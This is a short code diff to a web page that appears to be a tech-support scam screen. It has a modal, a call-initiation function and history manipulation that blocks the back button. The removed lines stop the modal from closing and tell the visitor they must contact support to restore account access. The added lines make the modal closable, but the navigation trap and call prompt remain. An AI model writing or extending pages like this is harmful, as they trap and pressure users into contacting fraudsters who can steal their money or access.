@@ -515,6 +515,7 @@
             color: #1a1a1a;
             font-family: 'Monaco', 'Courier New', monospace;
             letter-spacing: -0.5px;
+            text-decoration: none;
         }
 
         .modal-buttons {
@@ -1004,13 +1005,11 @@
         window.history.forward();
         window.history.replaceState(null, null, window.location.href);
 
-        // Store modal state
-        let modalClosed = false;
-
         function closeModal() {
-            // Don't actually close - just change appearance, prevent closing
-            alert('You must contact support to restore your account access.');
-            return false;
+            const modal = document.getElementById('alertModal');
+            if (modal) {
+                modal.style.display = 'none';
+            }
         }
 
         function initiateCallModal() {
